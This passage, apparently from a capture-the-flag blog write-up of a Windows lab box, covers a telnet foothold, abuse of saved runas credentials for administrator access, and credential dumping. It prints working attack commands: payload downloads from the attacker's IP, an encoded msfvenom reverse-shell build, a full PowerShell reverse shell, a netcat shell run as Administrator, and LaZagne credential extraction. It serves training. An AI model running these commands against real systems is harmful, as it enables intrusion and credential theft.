<li><a href="https://www.ostpstviewer.com/download.aspx">https://www.ostpstviewer.com/download.aspx</a></li>
</ul>
</li>
<li>
<p><strong>Once imported, I find a single email which contains a password for the <code>security</code> user:</strong></p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-10-113130_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h2 id="2-dot-foothold">2. Foothold:</h2>
<ul>
<li>
<p>With the new credentials for <code>security</code> I login to the telnet server</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-10-114238_.png">
</figure>
</li>
</ul>
</li>
<li>
<p>It gives me access to the <code>C:\</code> drive of the host.</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-10-114342_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="system-info">System Info:</h3>
<ul>
<li>I can see the system is actually running <code>Microsoft Windows Server 2008 R2 Standard</code>
<ul>
<li><figure><img src="/ox-hugo/2024-09-10-115018_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="shell-upgrade">Shell Upgrade:</h3>
<ul>
<li>
<p>Initially I try and run powershell but it crashes.</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-10-115727_.png">
</figure>
</li>
</ul>
</li>
<li>
<p>Telnet is trash, well it&rsquo;s not as we are accessing the host via it, but it&rsquo;s not great to work in. It&rsquo;s slow and doesn&rsquo;t allow us to delete characters. Lets upgrade our shell.</p>
</li>
<li>
<p><strong>Future bloodstiller here</strong>:</p>
<ul>
<li>We can actually get a good powershell session from telnet by doing the following:
<ul>
<li><code>powershell -File -</code></li>
<li><figure><img src="/ox-hugo/2024-09-10-173752_.png">
</figure>
</li>
<li>This was not something I was aware of until I had finished the box &amp; read 0xdf&rsquo;s awesome write-up: <a href="https://0xdf.gitlab.io/2019/03/02/htb-access.html">https://0xdf.gitlab.io/2019/03/02/htb-access.html</a> (i like to read other writeups after I have finished mine to see what I could have done differently and find a different perspective &amp; approach)</li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p><strong>I start a python server on my attack machine to host my nc.exe binary</strong>:</p>
</li>
<li>
<p><strong>I execute powershell from CMD &amp; get it to download the <code>nc.exe</code> binary</strong>:</p>
<ul>
<li><code>powershell -c &quot;(New-Object Net.WebClient).DownloadFile('http://10.10.14.44:9000/shell.exe','C:\Users\Security\shell.exe')&quot;</code>
<ul>
<li><figure><img src="/ox-hugo/2024-09-10-120151_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Start my nc listener on my attack host</strong>:</p>
<ul>
<li><code>nc -nvlp 9999</code></li>
</ul>
</li>
<li>
<p><strong>Trigger nc on the target to connect back</strong>:</p>
<ul>
<li>Annnnnnnnnd we are blocked by group policy! Sneaky admins.
<ul>
<li><figure><img src="/ox-hugo/2024-09-10-120536_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Lets try a super encoded shell</strong>:</p>
<ul>
<li><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.44 LPORT=9999 -a x86 --platform windows -e x86/shikata_ga_nai -i 100 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 200 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -f exe -o newshell1.exe</code>
<ul>
<li><strong>BLOCKED AGAIN!</strong>
<ul>
<li><figure><img src="/ox-hugo/2024-09-10-122626_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>We can assume that anything not on a strict &ldquo;allow&rdquo; list is blocked by Group Policy. So let&rsquo;s switch gears and just live off the land with good ol&rsquo; powershell.</p>
</li>
<li>
<p><strong>Simple Powershell reverse shell</strong>:</p>
<ul>
<li>Finally we get a connection with the below, I have this saved into my notes as a goto but if you are unfamiliar you can also generate it with:
<ul>
<li><a href="https://www.revshells.com/">https://www.revshells.com/</a>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>    powershell -nop -c <span style="color:#e6db74">&#34;</span>$client<span style="color:#e6db74"> = New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.44&#39;,9999);</span>$stream<span style="color:#e6db74"> = </span>$client<span style="color:#e6db74">.GetStream();[byte[]]</span>$bytes<span style="color:#e6db74"> = 0..65535|%{0};while((</span>$i<span style="color:#e6db74"> = </span>$stream<span style="color:#e6db74">.Read(</span>$bytes<span style="color:#e6db74">, 0, </span>$bytes<span style="color:#e6db74">.Length)) -ne 0){;</span>$data<span style="color:#e6db74"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span>$bytes<span style="color:#e6db74">,0, </span>$i<span style="color:#e6db74">);</span>$sendback<span style="color:#e6db74"> = (iex </span>$data<span style="color:#e6db74"> 2&gt;&amp;1 | Out-String );</span>$sendback2<span style="color:#e6db74"> = </span>$sendback<span style="color:#e6db74"> + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;</span>$sendbyte<span style="color:#e6db74"> = ([text.encoding]::ASCII).GetBytes(</span>$sendback2<span style="color:#e6db74">);</span>$stream<span style="color:#e6db74">.Write(</span>$sendbyte<span style="color:#e6db74">,0,</span>$sendbyte<span style="color:#e6db74">.Length);</span>$stream<span style="color:#e6db74">.Flush()};</span>$client<span style="color:#e6db74">.Close()&#34;</span></span></span></code></pre></div>
    
</div>
</li>
<li><figure><img src="/ox-hugo/2024-09-10-125803_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="zteko-enumeration">ZTeko Enumeration:</h3>
<ul>
<li>
<p>I find a file folder called <code>ZKTeco</code> in the root folder.</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-10-114513_.png">
</figure>
</li>
</ul>
</li>
<li>
<p>It appears to contain a copy of a program called <code>ZKAccess3.5</code></p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-10-114619_.png">
</figure>
</li>
</ul>
</li>
<li>
<p>A quick search turns up this public exploit:</p>
<ul>
<li><a href="https://www.exploit-db.com/exploits/40323">https://www.exploit-db.com/exploits/40323</a></li>
</ul>
</li>
</ul>
<blockquote>
<p>Desc: ZKAccess suffers from an elevation of privileges vulnerability
which can be used by a simple authenticated user that can change the
executable file with a binary of choice. The vulnerability exist due
to the improper permissions, with the &lsquo;M&rsquo; flag (Modify) for &lsquo;Authenticated Users&rsquo;
group.</p>
</blockquote>
<ul>
<li>
<p>I check the permissions to see if it&rsquo;s vulnerable:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-10-175706_.png">
</figure>
</li>
</ul>
</li>
<li>
<p>It&rsquo;s not, we are missing the <code>&quot;M&quot;</code> flag for <code>modify</code> for any of the users groups.</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-10-175906_.png">
</figure>
</li>
<li>So it appears this is not vulnerable to this specific exploit but I will put a pin in it, incase we can somehow leverage it later on.</li>
</ul>
</li>
</ul>
<h3 id="system-enumeration">System Enumeration:</h3>
<ul>
<li>We need to enumerate more to find a viable privesc path.</li>
<li>So WinPeas etc is great but I have been trying to manually enumerate more as a way to get better at living off the land and working with the tools locally. Let&rsquo;s do some standard enumeration and see what we have available.</li>
</ul>
<h4 id="user-privs">User Privs:</h4>
<ul>
<li>Little in the way of user or group privs:
<ul>
<li><figure><img src="/ox-hugo/2024-09-12-055358_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h4 id="installed-programs">Installed Programs:</h4>
<ul>
<li>I check for installed programs.</li>
</ul>
<!-- raw HTML omitted -->







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>(<span style="color:#e6db74">&#39;HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*&#39;</span>, <span style="color:#e6db74">&#39;HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&#39;</span>) | ForEach-Object { Get-ItemProperty -Path $_ } | Select-Object DisplayName, DisplayVersion, Publisher, InstallLocation, InstallDate | Format-Table -AutoSize</span></span></code></pre></div>
    
</div>
<ul>
<li>The only thing that jumps out at me is the ZKTeco software again.
<ul>
<li><figure><img src="/ox-hugo/2024-09-12-055836_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h2 id="3-dot-privesc">3. Privesc:</h2>
<h3 id="cmdkey-list-discovery">cmdkey /list discovery:</h3>
<ul>
<li><strong>I run</strong> <code>cmdkey /list</code> <strong>&amp; get a hit</strong>:
<ul>
<li>So we can see that the Administrator has a domain password stored on this machine!
<ul>
<li><figure><img src="/ox-hugo/2024-09-10-181320_.png">
</figure>
</li>
</ul>
</li>
<li><code>cmdkey /list</code> displays a list of stored usernames and credentials on the system.
<ul>
<li>It won&rsquo;t let us actually view the creds however we can start enumerating for files that would use this feature.</li>
<li>Now, we need to figure out what it&rsquo;s actually stored for, as windows may store creds for multiple reasons.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="lnk-file-enumeration">lnk file enumeration:</h3>
<ul>
<li>
<p>One reason that the system may have stored credentials is so that a binary can be run with elevated privileges without the administrator having to enter their credentials every time it runs.</p>
</li>
<li>
<p>A common way to do this is to use the <code>runas /savecred</code> switch within a shortcut/lnk file:</p>
</li>
<li>
<p>E.G. create a new <code>lnk/shorcut</code> file on windows but make the content the following:</p>
<ul>
<li><code>runas /user:&lt;username&gt; /savecred &quot;Your Executable Here&quot;</code> this will generate a shortcut file. It will request the credentials for the specified user the first time it&rsquo;s run &amp; store those credentials, but after that it will run in the context of that user every time by using the stored credentials.
<ul>
<li>The key thing for us as pentesters is this <strong><!-- raw HTML omitted -->Once credentials are saved using <code>runas /savecred</code>, any application can be run in the context of that account without re-entering the credentials.<!-- raw HTML omitted --></strong></li>
</ul>
</li>
<li>When these <code>lnk</code> files are generated they retain the <code>runas</code> string within them and we can enumerate and search for these to find out if this is a viable privesc path:</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li><strong>We can enumerate stored <code>lnk</code> files by doing the below and checking them for runas as strings</strong>:
<ol>
<li>
<p><strong>Generate a list of all <code>lnk</code> files on the system</strong>:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span> Get-ChildItem <span style="color:#e6db74">&#34;C:\&#34;</span> *.lnk -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.PSIsContainer <span style="color:#f92672">-eq</span> $false } | ForEach-Object { $_.FullName } | Out-File lnkFiles.txt</span></span></code></pre></div>
    
</div>
<ul>
<li><figure><img src="/ox-hugo/2024-09-12-065531_.png">
</figure>
</li>
<li><strong>Command Breakdown</strong>:
<ul>
<li>
<p><code>Get-ChildItem &quot;C:\&quot; *.lnk -Recurse -Force -ErrorAction SilentlyContinue</code></p>
<ul>
<li><code>Get-ChildItem</code>: Retrieves a list of items (files and directories) from the specified location.</li>
<li><code>&quot;C:\&quot;</code>: Specifies the root directory of the C:\ drive to search.</li>
<li><code>*.lnk</code>: Filters the search to only include files with the .lnk extension (shortcut files).</li>
<li><code>-Recurse</code>: Instructs PowerShell to search through all subdirectories of C:\, not just the top-level directory.</li>
<li><code>-Force</code>: Includes hidden and system files in the search.</li>
<li><code>-ErrorAction SilentlyContinue</code>: Suppresses error messages (like permission denied errors) from being displayed.</li>
</ul>
</li>
<li>
<p><code>| Where-Object { $_.PSIsContainer -eq $false }</code></p>
<ul>
<li><code>|</code>: Passes the output of Get-ChildItem to the next command in the pipeline.</li>
<li><code>Where-Object</code>: Filters objects passed through the pipeline based on a condition.</li>
<li><code>$_</code>: Represents the current object in the pipeline.</li>
<li><code>PSIsContainer -eq $false</code>: Ensures that only files (not directories) are passed through the pipeline. The PSIsContainer property is true for directories and false for files.</li>
</ul>
</li>
<li>
<p><code>| ForEach-Object { $_.FullName }</code></p>
<ul>
<li><code>|</code>: Continues passing the filtered files to the next command.</li>
<li><code>ForEach-Object { $_.FullName }</code>: Iterates over each file and extracts the FullName property, which is the complete path to the file.</li>
</ul>
</li>
<li>
<p><code>| Out-File lnkFiles.txt</code></p>
<ul>
<li><code>|</code>: Pipes the full file paths to the final command.</li>
<li><code>Out-File lnkFiles.txt</code>: Writes the output (the list of full file paths) to the file <code>lnkFiles.txt</code>.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Loop through the generated list try and read any text stored in the <code>.lnk</code> file</strong>:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="%20%20%20ForEach%28$file%20in%20Get-Content%20.%5clnkFiles.txt%29%20%7b%20Write-Output%20$file;%20Get-Content%20$file%20%7c%20Select-String%20runas%20-ErrorAction%20SilentlyContinue%20%7d">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>   <span style="color:#66d9ef">ForEach</span>($file <span style="color:#66d9ef">in</span> Get-Content .\lnkFiles.txt) { Write-Output $file; Get-Content $file | Select-String runas -ErrorAction SilentlyContinue }</span></span></code></pre></div>
    
</div>
<ul>
<li><strong>Command Breakdown</strong>:
<ul>
<li>
<p><code>ForEach($file in Get-Content .\lnkFiles.txt)</code></p>
<ul>
<li><code>ForEach($file in Get-Content .\lnkFiles.txt)</code>: Loops through each line (representing file paths) in the <code>lnkFiles.txt</code> file.</li>
<li><code>Get-Content .\lnkFiles.txt</code>: Reads the contents of <code>lnkFiles.txt</code> and treats each line (file path) as an item.</li>
<li><code>$file</code>: Represents the current file path from the loop.</li>
</ul>
</li>
<li>
<p><code>{ Write-Output $file</code>;</p>
<ul>
<li><code>Write-Output $file</code>: Outputs the current file path being processed (for visibility or logging purposes).</li>
<li>``This prints the file path from <code>lnkFiles.txt</code> to the console or wherever the output is being redirected.</li>
</ul>
</li>
<li>
<p><code>Get-Content $file |</code></p>
<ul>
<li><code>Get-Content $file</code>: Reads the content of the file represented by <code>$file</code>.
<ul>
<li><code>$file</code> is the current file path from the <code>lnkFiles.txt</code> file.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>Select-String runas -ErrorAction SilentlyContinue }</code></p>
<ul>
<li><code>|</code>: Pipes the content of the file into the next command.</li>
<li><code>Select-String runas</code>: Searches the file&rsquo;s content for the string <code>&quot;runas&quot;</code>.
<ul>
<li>If <code>&quot;runas&quot;</code> is found, the corresponding line will be output.</li>
</ul>
</li>
<li><code>-ErrorAction SilentlyContinue</code>: Suppresses any errors (e.g., if the file doesn&rsquo;t exist or there are issues reading it).</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li><strong>We get a hit!!!</strong>
<ul>
<li><figure><img src="/ox-hugo/2024-09-12-072950_.png">
</figure>

<ol>
<li>Tells us it is a <code>lnk</code> file for the ZKAccess3.5 binary.</li>
<li>We can see &ldquo;<code>runas.exe</code>&rdquo; is being used.</li>
<li>We can see the parmaters for the lnk file when it was created are:
<ul>
<li>&ldquo;<code>/user:ACCESS\Administrator /savecred &quot;C:\ZKTeco\ZKAccess3.5\Access.exe&quot;</code>&rdquo;</li>
</ul>
</li>
<li>The SID is the <code>500</code> sid which is the Administrator built in default account &amp; SID so we know it is 100% running in the context of that user when triggered.</li>
</ol>
</li>
<li>This means we can run any command in the context of the Administrator.</li>
</ul>
</li>
</ul>
<h2 id="4-dot-ownership">4. Ownership:</h2>
<p>Now that we know our privesc path I transfer my nc binary over to the host:</p>
<ul>
<li>
<p><strong>Transfer nc binary</strong>:</p>
<ul>
<li><code>powershell -c &quot;(New-Object Net.WebClient).DownloadFile('http://10.10.14.29:9000/nc.exe','C:\Users\Security\nc.exe')&quot;</code>
<ul>
<li><figure><img src="/ox-hugo/2024-09-12-063330_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Setup my listener</strong>: on my own host:</p>
<ul>
<li><code>nc -nvlp 9999</code></li>
</ul>
</li>
<li>
<p><strong>Trigger the exploit by running nc in the context of the administrator</strong>:</p>
<ul>
<li><code>runas /user:ACCESS\Administrator /savecred &quot;C:\Users\security\nc.exe 10.10.14.29 9999 -e cmd&quot;</code>
<ul>
<li><figure><img src="/ox-hugo/2024-09-12-063303_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Get my root shell</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-12-063246_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Get the flag</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-12-075636_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h2 id="5-dot-persistence">5. Persistence:</h2>
<ul>
<li><strong>I transfer LaZagne.exe over to the host</strong>:
<ul>
<li>
<p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
</li>
<li>
<p><code>powershell -c &quot;(New-Object Net.WebClient).DownloadFile('http://10.10.14.29:9000/LaZagne.exe','C:\Users\Security\lz.exe')&quot;</code></p>
</li>
<li>
<p><strong>I then run it and extract the hashes</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-12-081330_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I also get the clear text password for the Administrator user</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-12-081604_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I Verify this is correct by checking I can login as that user</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-12-081836_.png">
</figure>
</li>
<li>I now have persistence.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="lessons-learned">Lessons Learned:</h2>
<h3 id="what-did-i-learn">What did I learn?</h3>
<ol>
<li>I learned a lot more <code>lnk</code> files and how they hold information.</li>
<li>I learned how to upgrade the telnet shell (I was not aware that was a thing until now)</li>
<li>I laerned about <code>pst</code> files, I had not encountered them before, so that was new &amp; fun.</li>
</ol>
<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
<ol>
<li>Repeatedly trying to use a reverse shell &amp; get nc to work when the GPO was in place.</li>
</ol>
<h2 id="sign-off">Sign off:</h2>
<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
<p>Until next time, hack the planet!</p>
<p>– Bloodstiller</p>
<p>– Get in touch bloodstiller at proton dot me</p>

            
        </div>
    </article>

        </main>

        <footer class="footer">
    <div class="footer-left">
        <ul class="social">
            
                <li>All Rights Reserved ®.</li>
            

            
                <li>Bloodstiller</li>
            

            
                
            
                
            
                
                    <li>
                        
                            <a href="https://github.com/bloodstiller" target="_blank">
                                <i class="bi-github"></i>
                            </a>
                        

                    </li>
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
        </ul>
    </div>

    <div class="footer-right">
        <ul class="control status clearfix">
            
                <li>
                    
                        Word Count:
                        2644
                    
                </li>
            

            
            

            
                <li>en</li>
            

            
                <li>
                    <a href="https://gohugo.io" class="btn" target="_blank"
                        >Hugo: 0.135.0</a
                    >
                </li>
            

            
                <li>
                    <a
                        href="https://github.com/JingWangTW/dark-theme-editor"
                        class="btn"
                        target="_blank"
                        >Theme: dark-theme-editor</a
                    >
                </li>
            

            
                <li>
                    
                        Last modified: &nbsp;
                        <time>
                            Sep 12 2024 00:00:00
                        </time>
                    
                </li>
            

            
                <li title="">
                    
                </li>
            
        </ul>
    </div>
</footer>

    </body>

    






















    
        
        <script
            type="text/javascript"
            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/custom.baf1622c95b2ed38ea638ca259c323d2a5537d258fb923994e97539b4c4ecf706c7992482768366adddcb83153dce8c33f5fc95a5c8abe6b2a03046892509fae.js"
            integrity="sha512-uvFiLJWy7TjqY4yiWcMj0qVTfSWPuSOZTpdTm0xOz3BseZJIJ2g2at3cuDFT3OjDP1/JWlyKvmsqAwRoklCfrg=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
    















<link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />




</html>
